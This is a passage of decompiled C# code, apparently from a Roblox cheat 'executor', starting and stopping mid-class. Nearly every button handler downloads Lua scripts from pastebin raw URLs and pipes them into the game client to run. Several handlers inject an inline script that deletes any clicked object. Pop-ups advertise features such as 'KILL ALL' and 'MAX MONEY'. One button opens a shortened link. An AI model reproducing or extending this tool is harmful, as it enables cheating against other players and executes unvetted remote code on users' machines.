    }

    private void flatButton553_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/6Qiznjdm"));
      Thread.Sleep(100);
      int num = (int) MessageBox.Show("PRESS U TO FREECAM AND Y TO NORMAL", "JAILBREAK CMD", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    private void flatButton552_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/naUKrRp7"));
      Thread.Sleep(100);
    }

    private void flatButton551_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/wHuhYKij"));
      Thread.Sleep(100);
    }

    private void flatButton563_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/p7qKVei0"));
      Thread.Sleep(100);
    }

    private void flatButton564_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/Y6t7cK2N"));
      Thread.Sleep(100);
    }

    private void flatButton565_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/gquW1ZGt"));
      Thread.Sleep(100);
    }

    private void flatButton566_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/CmT6mxsM"));
      Thread.Sleep(100);
    }

    private void flatButton568_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
      int num = (int) MessageBox.Show("MORE SOON HARD TO FIND", "MORE LATER", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    private void flatButton569_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/ELDD3veU"));
      Thread.Sleep(100);
    }

    private void flatButton570_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/mANZemT2"));
      Thread.Sleep(100);
    }

    private void flatButton571_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/Hf41TCBR"));
      Thread.Sleep(100);
    }

    private void flatButton572_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/BGUafNLv"));
      Thread.Sleep(100);
    }

    private void flatButton573_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/UTfL3Sk5"));
      Thread.Sleep(100);
    }

    private void flatButton574_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton575_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/3Ee0dA5X"));
      Thread.Sleep(100);
    }

    private void flatButton576_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton577_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/3Ee0dA5X"));
      Thread.Sleep(100);
    }

    private void flatButton578_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/baBsL8Ni"));
      Thread.Sleep(100);
    }

    private void flatButton579_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/68Xdm0Nu"));
      Thread.Sleep(100);
    }

    private void flatButton581_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/JwVUndCK"));
      Thread.Sleep(100);
    }

    private void flatButton580_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton582_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton583_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/YFhE5HTB"));
      Thread.Sleep(100);
    }

    private void flatButton584_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton585_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/Tz7NQV8j"));
      Thread.Sleep(100);
    }

    private void flatButton586_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton587_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/SKYg1ukn"));
      Thread.Sleep(100);
    }

    private void flatButton588_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton589_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/VH6bhQz4"));
      Thread.Sleep(100);
    }

    private void flatButton590_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/80Mkb4Eb"));
      Thread.Sleep(100);
    }

    private void flatButton591_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/QmWPX7PU"));
      Thread.Sleep(100);
    }

    private void flatButton592_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/RQgWcK5c"));
      Thread.Sleep(100);
    }

    private void flatButton593_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/hdwn3DFq"));
      Thread.Sleep(100);
    }

    private void flatButton594_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton595_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/f7fqdcH3"));
      Thread.Sleep(100);
    }

    private void flatButton596_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/f7fqdcH3"));
      Thread.Sleep(100);
    }

    private void flatButton597_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/yQECcxLh"));
      Thread.Sleep(100);
    }

    private void flatButton598_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/A0fyeXim"));
      Thread.Sleep(100);
    }

    private void flatButton599_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/KbcQhqnF"));
      Thread.Sleep(100);
    }

    private void flatButton600_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/WiEWT7GS"));
      Thread.Sleep(100);
    }

    private void flatButton601_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton603_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/PpuKkWcP"));
      Thread.Sleep(100);
    }

    private void flatButton602_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/cLC0vNuL"));
      Thread.Sleep(100);
    }

    private void flatButton604_Click(object sender, EventArgs e)
    {
      Process.Start("https://ckk.ai/OGaXJ");
    }

    private void flatButton605_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/ZbVFCMHM"));
      Thread.Sleep(100);
    }

    private void flatButton606_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/XzN9zhM4"));
      Thread.Sleep(100);
    }

    private void flatButton608_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/Nk76srDv"));
      Thread.Sleep(100);
    }

    private void flatButton607_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton610_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/mSxheuyU"));
      Thread.Sleep(100);
    }

    private void flatButton609_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton612_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/yNXuvZK3"));
      Thread.Sleep(100);
    }

    private void flatButton611_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton614_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/BH1c7ctG"));
      Thread.Sleep(100);
    }

    private void flatButton613_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/eJS8CM9Z"));
      Thread.Sleep(100);
      int num = (int) MessageBox.Show("X = KILL ALL Z = MAX MONEY", "MORE LATER", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    private void panel4_Paint(object sender, PaintEventArgs e)
    {
    }

    private void pictureBox25_Click(object sender, EventArgs e)
    {
    }

    private void pictureBox2_MouseMove(object sender, MouseEventArgs e)
    {
    }

    private void pictureBox25_MouseMove(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        return;
      this.Left += e.X - this.lastPoint.X;
      this.Top += e.Y - this.lastPoint.Y;
    }

    private void pictureBox25_MouseDown(object sender, MouseEventArgs e)
    {
      this.lastPoint = new Point(e.X, e.Y);
    }

    private void flatButton615_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/eaj0iMHf"));
      Thread.Sleep(100);
    }

    private void flatButton616_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/FyVBrAaE"));
      Thread.Sleep(100);
    }

    private void flatButton617_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton619_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/T23DsZRn"));
      Thread.Sleep(100);
    }

    private void flatButton618_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton620_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/1r90FqcM"));
      Thread.Sleep(100);
    }

    private void flatButton621_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton622_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/c8uVeuuL"));
      Thread.Sleep(100);
    }

    private void flatButton623_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/JtkE2uFF"));
      Thread.Sleep(100);
    }

    private void flatButton625_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/KHz7uY8W"));
      Thread.Sleep(100);
    }

    private void flatButton624_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton626_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/YrhT9gDB"));
      Thread.Sleep(100);
    }

    private void flatButton628_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/YbkaA3eU"));
      Thread.Sleep(100);
    }

    private void flatButton627_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton630_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/vSX1gc92"));
      Thread.Sleep(100);
    }

    private void flatButton629_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton631_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/TKFqLg9x"));
      Thread.Sleep(100);
    }

    private void flatButton633_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/TKFqLg9x"));
      Thread.Sleep(100);
    }

    private void flatButton632_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton635_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/q248cr5u"));
      Thread.Sleep(100);
    }

    private void flatButton634_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton636_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/eitNmHir"));
      Thread.Sleep(100);
    }

    private void flatButton637_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton639_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/Zuc9QpJZ"));
      Thread.Sleep(100);
    }

    private void flatButton638_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton641_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/k0d199Mv"));
      Thread.Sleep(100);
    }

    private void flatButton640_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/ZCz6Xqjd"));
      Thread.Sleep(100);
    }

    private void flatButton642_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/F1MMhiZy"));
      Thread.Sleep(100);
    }

    private void flatButton643_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton644_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/By4x7YtV"));
      Thread.Sleep(100);
    }

    private void flatButton646_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/phhx4wKF"));
      Thread.Sleep(100);
    }

    private void flatButton645_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton647_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/17iPgpTT"));
      Thread.Sleep(100);
    }

    private void flatButton649_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/vJT07d9T"));
      Thread.Sleep(100);
    }

    private void flatButton648_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton650_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/jGC3iSbu"));
      Thread.Sleep(100);
    }

    private void flatButton651_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton653_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/XdD0ragK"));
      Thread.Sleep(100);
    }

    private void flatButton655_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/rUmSbjZd"));
      Thread.Sleep(100);
    }

    private void flatButton654_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton656_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/QiGVMN2L"));
      Thread.Sleep(100);
    }

    private void flatButton658_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/ecVSVQ3c"));
      Thread.Sleep(100);
    }

    private void flatButton657_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton660_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/uepfVV8b"));
      Thread.Sleep(100);
    }

    private void flatButton659_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton662_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/hFs9Yc2T"));
      Thread.Sleep(100);
    }

    private void flatButton661_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton664_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/WH4X80Ww"));
      Thread.Sleep(100);
    }

    private void flatButton663_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton666_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/aK9n6GEj"));
      Thread.Sleep(100);
    }

    private void flatButton665_Click(object sender, EventArgs e)
    {
